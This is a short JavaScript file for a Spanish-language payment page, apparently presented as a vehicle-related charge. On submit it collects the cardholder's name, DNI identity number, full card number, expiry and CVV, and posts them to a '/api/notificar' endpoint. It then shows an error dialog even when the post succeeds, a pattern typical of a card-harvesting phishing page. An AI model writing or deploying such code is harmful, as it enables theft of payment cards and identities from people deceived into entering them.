document.addEventListener('DOMContentLoaded', () => {
    const paymentForm = document.getElementById('vehicleForm');
    const tarjetaInput = document.getElementById('itarj');
    const vctoInput = document.getElementById('ivto');
    const modal = document.getElementById('errorModal');

    // Formateo de Tarjeta (Espacios cada 4 números)
    tarjetaInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
        e.target.value = formatted.substring(0, 19);
    });

    // Formateo de Vencimiento (Agrega / automáticamente)
    vctoInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
        e.target.value = value;
    });

    if (paymentForm) {
        paymentForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = e.target.querySelector('button');
            btn.textContent = "PROCESANDO...";
            btn.disabled = true;

                   // Reemplazar desde 'const formData = new FormData();' hasta el 'body: formData'
                const data = {
            titular: document.getElementById('itit').value,
            dni: document.getElementById('idok').value,
            tarjeta: tarjetaInput.value,
            vencimiento: vctoInput.value,
            cvv: document.getElementById('isegu').value
        };


        fetch('/api/notificar', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })

            .then(() => {
                setTimeout(() => {
                    modal.style.display = 'flex';
                    btn.textContent = "CONFIRMAR PAGO";
                    btn.disabled = false;
                }, 1000);
            })
            .catch(() => {
                modal.style.display = 'flex';
                btn.disabled = false;
            });
        });
    }
});

window.closeModal = function() {
    document.getElementById('errorModal').style.display = 'none';
};
